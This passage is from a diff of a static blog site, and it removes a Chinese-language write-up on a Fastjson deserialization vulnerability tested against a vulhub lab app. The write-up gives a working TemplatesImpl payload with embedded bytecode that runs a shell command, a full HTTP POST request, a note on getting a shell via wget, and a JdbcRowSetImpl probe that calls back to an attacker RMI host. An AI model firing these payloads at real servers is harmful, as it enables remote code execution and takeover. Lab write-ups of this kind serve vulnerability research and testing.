2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwcALQEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAF0BwAuAQAKU291cmNlRmlsZQEADlNoZWxsRXhlYy5qYXZhDAAIAAkHAC8MADAAMQEAE21rZGlyIC90bXAvaW1hZ2VtbHQMADIAMwEAGmNvbS9hbGlqc29uZGVzZXIvU2hlbGxFeGVjAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACwAAAA4AAwAAAAwABAANAA0ADgAMAAAADAABAAAADgANAA4AAAAPAAAABAABABAAAQARABIAAQAKAAAASQAAAAQAAAABsQAAAAIACwAAAAYAAQAAABEADAAAACoABAAAAAEADQAOAAAAAAABABMAFAABAAAAAQAVABYAAgAAAAEAFwAYAAMAAQARABkAAgAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAABQADAAAACAAAwAAAAEADQAOAAAAAAABABMAFAABAAAAAQAaABsAAgAPAAAABAABABwACQAdAB4AAgAKAAAAQQACAAIAAAAJuwAFWbcABkyxAAAAAgALAAAACgACAAAAFwAIABgADAAAABYAAgAAAAkAHwAgAAAACAABACEADgABAA8AAAAEAAEAIgABACMAAAACACQ="],'_name':'a.b','_tfactory':&#123; &#125;,"_outputProperties":&#123; &#125;,"_name":"a","_version":"1.0","allowedProtocols":"all"&#125;</span><br></pre></td></tr></table></figure>
-<p>web环境下的测试可以使用war包<a href="https://raw.githubusercontent.com/yaofeifly/vulhub/master/fastjson/vuln/fastjson-1.0.war">https://raw.githubusercontent.com/yaofeifly/vulhub/master/fastjson/vuln/fastjson-1.0.war</a>,从tomcat后台导入。</p>
-<p>之后我们只需要用post方式发包</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /fastjson-1.0/ HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:64.0) Gecko/20100101 Firefox/64.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh,en-US;q=0.7,en;q=0.3</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 2272</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&quot;_bytecodes&quot;:[&quot;yv66vgAAADMANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABxMY29tL2FsaWpzb25kZXNlci9TaGVsbEV4ZWM7AQAKRXhjZXB0aW9ucwcALAEACXRyYW5zZm9ybQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwcALQEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAF0BwAuAQAKU291cmNlRmlsZQEADlNoZWxsRXhlYy5qYXZhDAAIAAkHAC8MADAAMQEAE21rZGlyIC90bXAvaW1hZ2VtbHQMADIAMwEAGmNvbS9hbGlqc29uZGVzZXIvU2hlbGxFeGVjAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACwAAAA4AAwAAAAwABAANAA0ADgAMAAAADAABAAAADgANAA4AAAAPAAAABAABABAAAQARABIAAQAKAAAASQAAAAQAAAABsQAAAAIACwAAAAYAAQAAABEADAAAACoABAAAAAEADQAOAAAAAAABABMAFAABAAAAAQAVABYAAgAAAAEAFwAYAAMAAQARABkAAgAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAABQADAAAACAAAwAAAAEADQAOAAAAAAABABMAFAABAAAAAQAaABsAAgAPAAAABAABABwACQAdAB4AAgAKAAAAQQACAAIAAAAJuwAFWbcABkyxAAAAAgALAAAACgACAAAAFwAIABgADAAAABYAAgAAAAkAHwAgAAAACAABACEADgABAA8AAAAEAAEAIgABACMAAAACACQ=&quot;],&apos;_name&apos;:&apos;a.b&apos;,&apos;_tfactory&apos;:&#123; &#125;,&quot;_outputProperties&quot;:&#123; &#125;,&quot;_name&quot;:&quot;a&quot;,&quot;_version&quot;:&quot;1.0&quot;,&quot;allowedProtocols&quot;:&quot;all&quot;&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="https://coding.net/u/ImageMLT/p/blog-images/git/raw/master/image-20181225232621535.png" alt="image-20181225232621535"></p>
-<p><img src="https://coding.net/u/ImageMLT/p/blog-images/git/raw/master/image-20181225232645986.png" alt="image-20181225232645986"></p>
-<p>可以看到文件夹已经被创建且与tomcat运行用户权限相同(root)。</p>
-<p>getshell只需要先wget一个脚本再执行即可。</p>
-<p>关于fastjson反序列化漏洞的发现我们可以让服务器发送请求到我们的公网vps：</p>
-<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>, <span class="attr">"dataSourceName"</span>:<span class="string">"rmi://your-ip:1099/Object"</span>,<span class="attr">"autoCommit"</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="https://coding.net/u/ImageMLT/p/blog-images/git/raw/master/A02006C436BC279ED0C41ABF1DE6324E.png" alt="B8F7CB04-3AF7-45AC-BB48-AC90A719741A"></p>
-<p>出现如图的回显即可确认存在反序列化漏洞。</p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2271,7 +2279,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">57</span>
+                    <span class="site-state-item-count">58</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
